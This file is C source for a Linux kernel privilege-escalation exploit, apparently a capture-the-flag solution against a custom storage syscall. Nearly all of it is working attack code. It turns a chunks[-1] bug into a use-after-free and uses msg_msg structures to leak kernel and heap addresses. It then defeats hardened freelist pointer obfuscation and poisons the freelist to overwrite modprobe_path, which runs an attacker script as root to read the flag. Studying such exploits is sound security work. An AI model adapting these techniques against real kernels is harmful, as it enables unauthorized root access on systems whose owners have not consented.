#define _GNU_SOURCE
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/userfaultfd.h>
#include "utils.h"

#define IPS 548
#define MAX 16
uint64_t kernel_base, kernel_heap;
uint64_t modprobe_path;
uint64_t slab_random;

uint64_t user_cs, user_ss, user_sp, user_rflags;

typedef struct {
    int idx;
    uint16_t priority;
    char *data;
} userdata;

typedef struct {
  void *next;
  int idx;
  unsigned short priority;
  char data[114];
} chunk;

typedef struct
{
    long mtype;
    char mtext[0x1];
} msg_buf;

typedef struct 
{
    void *ll_next;
    void *ll_prev;
    long m_type;
    size_t m_ts;
    void *next;
    void *security; // available in selinux
} msg_header;

typedef struct
{
    char index;
    void *ptr;
    void *next_ptr;
    uint64_t offset; // distance from msg_msg uaf struct
} storage;

void save_state(void);
int do_alloc(uint16_t, char *);
int do_remove(int );
int do_edit(int , char *);
int do_copy(int );
int do_call(int, int , uint16_t, char *);
void prepare_payload(char*, long, size_t);
void find_kernel_image(char*);

int main() 
{
    prepare_modprobe_path();
    puts("edit_storage: 0xffffffff813e06e0");
    puts("remove_storage: 0xffffffff813e06c0");
    puts("alloc_storage: 0xffffffff813e05f0");
    puts("copy_storage: 0xffffffff813e0900");
    puts("chunks: 0xffffffff82cec8c0");

    // fill all storages
    char data[114] = {0}, payload[0x1000] = {0};
    
    char index = 0x41;
    for (int i=0;i<MAX;i++) {
        memset(data, index++, sizeof(data));
        do_alloc(-1, data);
    }

    // copy a chunk with full storages => create a pointer at chunks[-1]
    do_copy(0);
    // remove that chunk and we have a kuaf object at chunks[-1]
    do_remove(0);

    // prepare msg_queue
    int qid = make_queue(IPC_PRIVATE, 0644 | IPC_CREAT), size = 0x80;
    msg_buf *message = (msg_buf *) payload;
    message->mtype = 1;
    memset(message->mtext, 0x41, size);
    send_msg(qid, message, size-0x30, 0);

    // uaf overwrite m_ts of msg_msg struct
    char buffer[0x12] = {0};
    prepare_payload(buffer, 0x4141414141414141, 0x1010);

    do_edit(-1, buffer);
    // dump_output(buffer, sizeof(buffer));

    char output[0x2000] = {0};
    get_msg(qid, output, 0x1010, 0x4141414141414141, 0);
    
    chunk *chunks = (chunk *) (output+114-0x10-0x8-2);
    
    // create a list contain storage pointer
    storage storage_list[0x10];
    // find next_ptr of storage
    uint64_t offset = 0;
    for(int i=0;i<10;i++) {
        offset += 0x80;
        if ((uint64_t) chunks[i].next >> 48 == 0xffff && (uint64_t) chunks[i].next << 16 >> 56 != 0xff) {
            storage_list[chunks[i].data[0] - 0x40].next_ptr = chunks[i].next;
            storage_list[chunks[i].data[0] - 0x40].offset = offset;
        }
    }
    // find address of storage
    for(int i=0;i<0x10;i++) {
        if (storage_list[i].next_ptr != 0) {
            storage_list[i+1].ptr = storage_list[i].next_ptr;
        }
    }
    
    puts("-----------------------------------------");
    for (int i=0;i<0x10;i++) {
        printf("index: %d - ptr 0x%lx - next_ptr: 0x%lx - offset: 0x%lx\n", i, 
                (void *)storage_list[i].ptr, 
                (void *)storage_list[i].next_ptr,
                (void *)storage_list[i].offset);
    }
    puts("-----------------------------------------");

    // find kernel_image
    find_kernel_image(output);

    // alloc a msg_msg struct (because of lifo we need to do this first)
    // i dont know why
    // i shouldnt wonder why
    // but the old queue will hang when send a new message
    qid = make_queue(IPC_PRIVATE, 0644 | IPC_CREAT);
    msg_buf *message2 = (msg_buf *) payload;
    message2->mtype = 1;
    memset(message2->mtext, 0x69, size);
    send_msg(qid, message2, size-0x30, 0);
    do_edit(-1, buffer);

    // find 2 adjacent chunks => bypass harden free_list ptr
    int target_idx = 0;
    for (int i=1;i<0x10;i++) {
        if (storage_list[i-1].next_ptr != NULL && storage_list[i].next_ptr != NULL) {
            target_idx = i;
            break;        
        }
    }
    if (target_idx == 0)
        panic("[!] Error: can't find target_idx");
    printf("[+] target idx: %d\n", target_idx);


    // remove target_idx to leak obfuscated pointer
    do_remove(target_idx);
    // remove target_idx + 1 cause we know its address => make it to the freelist_ptr of target_idx
    do_remove(target_idx-1);
    memset(output, 0, sizeof(memset));
    get_msg(qid, output, 0x1010, 0x4141414141414141, 0);
    
    
    uint64_t ptr_addr = storage_list[target_idx].ptr+0x40, freelist_ptr = storage_list[target_idx].next_ptr, random, obfuscated_ptr;
    offset = storage_list[target_idx].offset;
    printf("[+] ptr_addr: 0x%lx\n", ptr_addr);
    printf("[+] freelist_ptr: 0x%lx\n", freelist_ptr);

    // take the obfuscated pointer

    memcpy(&obfuscated_ptr, output+offset+0x18, 8);

    printf("[+] obfuscated_ptr: 0x%lx\n", obfuscated_ptr);
    printf("[+] bswap(ptr_addr): 0x%lx\n", bswap(ptr_addr));
    random = bswap(ptr_addr) ^ freelist_ptr ^ obfuscated_ptr;
    printf("[+] random: 0x%lx\n", random);

    // fake freelist 
    uint64_t fake_freelist_point_to_modprobe, uaf_chunk_addr = ptr_addr - offset;
    fake_freelist_point_to_modprobe = bswap(uaf_chunk_addr) ^ random ^ (modprobe_path-0x10);

    printf("[+[ uaf_chunk_addr: 0x%lx\n", uaf_chunk_addr);

    // memcpy stops when hit NULL
    memset(data, 0x13, sizeof(data));
    memcpy(data+0x32, &fake_freelist_point_to_modprobe, 8);
    dump_output(data+2, sizeof(data));
    do_edit(-1, data);

    strcpy(data+2, "/home/user/copy.sh");
    do_alloc(-1, data);
    do_alloc(-1, data);
    system("/home/user/dummy");
    system("cat /home/user/flag");

}

void prepare_payload(char *payload, long mtype, size_t m_ts)
{
    memset(payload, 0xff, 2);
    struct partial_msg_header {
        long m_type;
        size_t m_ts;
    };
    struct partial_msg_header *tmp = payload+2;
    tmp->m_type = mtype;
    tmp->m_ts = m_ts;
}

int do_call(int choice, int idx, ushort priority, char *data)
{
    userdata req = {
        .idx = idx,
        .priority = priority,
        .data = data
    };

    return syscall(IPS, choice, &req);
}

int do_alloc(ushort priority, char *data) 
{
    return do_call(1, -1, priority, data);
}

int do_remove(int idx) 
{
    return do_call(2, idx, 0, "");
}

int do_edit(int idx, char *data) 
{
    return do_call(3, idx, 0, data);
}

int do_copy(int idx)
{
    return do_call(4, idx, 0, "");
}

void find_kernel_image(char *output)
{
    // i know it is ugly but it works
    uint64_t *tmp = (uint64_t *) output;
    for (int i=0;i<0xa00/8;i++) {
        if (kernel_base == 0) {
            if (tmp[i] >> 32 == 0xffffffff && tmp[i] << 56 >> 56 == 0xa0)
                    kernel_base = tmp[i] - (0xffffffff826429a0-0xffffffff81000000);
            else if (tmp[i] >> 32 == 0xffffffff && tmp[i] << 56 >> 56 == 0xc0)
                    kernel_base = tmp[i] - (0xffffffff8260cec0-0xffffffff81000000);
            else if (tmp[i] >> 32 == 0xffffffff && tmp[i] << 56 >> 56 == 0xe0)
                    kernel_base = tmp[i] - (0xffffffff81a11600-0xffffffff81000000);
        }
    }
    if (kernel_base == 0) {
        panic("[!] Error: cannot find kernel_base");
    }
    modprobe_path = kernel_base + (0xffffffff8244fa20-0xffffffff81000000);
    printf("[+] kernel_base: 0x%lx\n", kernel_base);
    printf("[+] modprobe_path: 0x%lx\n", modprobe_path);
}
